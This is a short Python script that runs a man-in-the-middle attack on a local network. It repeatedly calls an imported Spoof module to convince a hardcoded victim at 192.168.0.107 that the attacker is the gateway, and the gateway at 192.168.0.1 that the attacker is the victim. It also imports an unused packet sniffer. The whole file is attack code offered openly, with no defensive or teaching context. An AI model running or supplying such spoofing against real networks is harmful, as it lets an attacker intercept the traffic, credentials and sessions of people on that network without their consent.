import Spoof
import time
from analyzePacket import sniff_packets


def mitm(victim_ip, gateway_ip):
    while True:
        # Tell the victim that we're the gateway
        Spoof.spoof(victim_ip, gateway_ip)
        # Tell the gateway that we're the victim
        Spoof.spoof(gateway_ip, victim_ip)
        time.sleep(2)

victim_ip = "192.168.0.107"
gateway_ip = "192.168.0.1"

mitm(victim_ip, gateway_ip)

